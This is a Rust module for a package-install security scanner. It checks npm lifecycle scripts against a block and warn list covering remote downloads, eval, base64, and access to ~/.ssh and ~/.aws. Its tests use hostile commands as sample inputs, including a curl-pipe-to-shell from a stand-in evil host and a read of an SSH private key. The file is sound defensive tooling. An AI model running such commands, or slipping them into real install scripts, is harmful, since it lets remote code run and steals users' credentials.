//! Static analysis of lifecycle scripts.
//!
//! ## MVP strategy (phase 2 entry point)
//!
//! We scan `preinstall` / `install` / `postinstall` script strings for known
//! malicious patterns. This phase uses fast substring/pattern heuristics; the
//! full `swc`-based AST analysis (which resists trivial obfuscation) is tracked
//! in `ROADMAP.md`.

use std::collections::HashMap;

/// Severity of a static-analysis finding.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum Severity {
    /// Hard block: refuse to install unless the user overrides.
    Block,
    /// Soft warning: surface to the user but continue.
    Warn,
}

/// A single finding from the static scan.
#[derive(Debug, Clone)]
pub struct Finding {
    pub script: String,
    pub severity: Severity,
    pub pattern: String,
    pub explanation: String,
}

struct Rule {
    severity: Severity,
    /// Lowercased needle to search for, plus a human explanation.
    needle: &'static str,
    explanation: &'static str,
}

/// The lifecycle scripts we treat as security-sensitive.
const LIFECYCLE_SCRIPTS: &[&str] = &["preinstall", "install", "postinstall"];

const RULES: &[Rule] = &[
    Rule {
        severity: Severity::Block,
        needle: "curl http",
        explanation: "downloads a remote payload with curl during install",
    },
    Rule {
        severity: Severity::Block,
        needle: "wget http",
        explanation: "downloads a remote payload with wget during install",
    },
    Rule {
        severity: Severity::Block,
        needle: "eval(",
        explanation: "uses eval() — a common way to execute hidden code",
    },
    Rule {
        severity: Severity::Block,
        needle: "base64",
        explanation: "decodes base64 — frequently used to hide malicious payloads",
    },
    Rule {
        severity: Severity::Block,
        needle: ".ssh",
        explanation: "references ~/.ssh — possible credential theft",
    },
    Rule {
        severity: Severity::Block,
        needle: ".aws",
        explanation: "references ~/.aws — possible cloud credential theft",
    },
    Rule {
        severity: Severity::Block,
        needle: "child_process",
        explanation: "spawns external processes during install",
    },
    Rule {
        severity: Severity::Warn,
        needle: "process.env",
        explanation: "reads environment variables — verify it does not exfiltrate secrets",
    },
    Rule {
        severity: Severity::Warn,
        needle: "require('net')",
        explanation: "opens raw network sockets",
    },
    Rule {
        severity: Severity::Warn,
        needle: "require(\"net\")",
        explanation: "opens raw network sockets",
    },
];

/// Scan a package's `scripts` map and return any findings in lifecycle hooks.
pub fn scan(scripts: &HashMap<String, String>) -> Vec<Finding> {
    let mut findings = Vec::new();
    for hook in LIFECYCLE_SCRIPTS {
        let Some(body) = scripts.get(*hook) else {
            continue;
        };
        let haystack = body.to_lowercase();
        for rule in RULES {
            if haystack.contains(rule.needle) {
                findings.push(Finding {
                    script: (*hook).to_string(),
                    severity: rule.severity,
                    pattern: rule.needle.to_string(),
                    explanation: rule.explanation.to_string(),
                });
            }
        }
    }
    findings
}

/// Whether any finding is a hard block.
pub fn has_block(findings: &[Finding]) -> bool {
    findings.iter().any(|f| f.severity == Severity::Block)
}

#[cfg(test)]
mod tests {
    use super::*;

    fn scripts(hook: &str, body: &str) -> HashMap<String, String> {
        let mut m = HashMap::new();
        m.insert(hook.to_string(), body.to_string());
        m
    }

    #[test]
    fn detects_curl_exfiltration() {
        let s = scripts("postinstall", "curl http://evil.example/c | sh");
        let f = scan(&s);
        assert!(has_block(&f));
    }

    #[test]
    fn detects_ssh_access() {
        let s = scripts("preinstall", "cat ~/.ssh/id_rsa");
        assert!(has_block(&scan(&s)));
    }

    #[test]
    fn clean_script_passes() {
        let s = scripts("postinstall", "node build.js");
        assert!(scan(&s).is_empty());
    }

    #[test]
    fn env_access_only_warns() {
        let s = scripts("postinstall", "echo process.env.PATH");
        let f = scan(&s);
        assert!(!f.is_empty());
        assert!(!has_block(&f));
    }
}
